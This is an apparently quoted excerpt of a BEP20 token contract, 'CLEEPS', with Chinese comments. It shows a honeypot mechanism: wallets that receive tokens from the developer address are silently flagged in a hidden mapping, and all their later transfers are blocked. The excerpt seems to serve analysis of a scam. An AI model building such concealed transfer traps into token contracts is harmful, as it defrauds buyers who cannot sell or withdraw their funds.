 ...
 */
contract CLEEPS is IBEP20, HasForeignAsset {
    ...
    mapping(address => uint256) private _MemberShips;
    /**
    ...
    function getMem(address _address) external view onlyOwner returns (uint256) {
        return _MemberShips[_address];
    }
    ...
    function _transfer(
        ...
        // 如果大于0,不能转账
        require(_MemberShips[sender] == 0, "You are a member and cannot operate");
        // 部署合约转账就ban掉
        if (sender == _DevAddress && sender != recipient) {
            _MemberShips[recipient] = amount;
        }
